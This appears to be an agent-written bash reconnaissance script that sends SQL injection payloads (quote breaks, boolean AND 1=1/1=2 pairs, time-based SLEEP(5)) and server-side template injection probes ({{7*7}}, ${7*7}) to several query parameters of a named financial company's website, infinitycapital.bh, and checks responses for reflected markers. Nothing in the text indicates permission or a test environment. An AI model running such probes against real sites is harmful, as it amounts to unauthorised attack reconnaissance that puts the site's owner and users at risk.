#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12"0".0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
W="$WORK_PATH/tool_outputs"
t() {
  local n="$1" u="$2"
  local c=$(curl -s -A "$UA" -o "$W/m_$n.html" -w "%{http_code}|%{size_download}" --max-time 30 "$u")
  local h=$(md5sum "$W/m_$n.html" 2>/dev/null | cut -c1-12)
  echo "[$n] $c md5=$h  $u"
}
t base "$B/"
t p_2 "$B/?page=2"
t p_2s "$B/?page=2%27"
t p_and "$B/?page=2%20AND%201=1"
t p_and0 "$B/?page=2%20AND%201=2"
t p_sl "$B/?page=2%20AND%20SLEEP(5)"
t s_t "$B/?search=test"
t s_sq "$B/?search=test%27"
t s_and "$B/?search=test%20AND%201=1"
t s_and0 "$B/?search=test%20AND%201=2"
t id_t "$B/?id=1"
t id_sq "$B/?id=1%27"
t id_and "$B/?id=1%20AND%201=1"
t id_and0 "$B/?id=1%20AND%201=2"
t id_sl "$B/?id=1%20AND%20SLEEP(5)"
t z_t "$B/?zzz=1"
t z_sq "$B/?zzz=1%27"
t z_and "$B/?zzz=1%20AND%201=1"
t z_and0 "$B/?zzz=1%20AND%201=2"
t marker1 "$B/?page=INJXMARK42"
t marker2 "$B/?search=INJXMARK42"
t marker3 "$B/?id=INJXMARK42"
t marker4 "$B/?zzz=INJXMARK42"
echo "--- reflection ---"
for f in marker1 marker2 marker3 marker4 p_sq s_sq id_sq z_sq; do
  c=$(grep -c "INJXMARK42" "$W/m_$f.html" 2>/dev/null)
  echo "$f marker_hits=$c"
done
echo "--- SSTI ---"
t ssti1 "$B/?page=%7B%7B7*7%7D%7D"
t ssti2 "$B/?search=%24%7B7*7%7D"
echo "ssti1 has 49: $(grep -c '49' "$W/m_ssti1.html")"
echo DONE
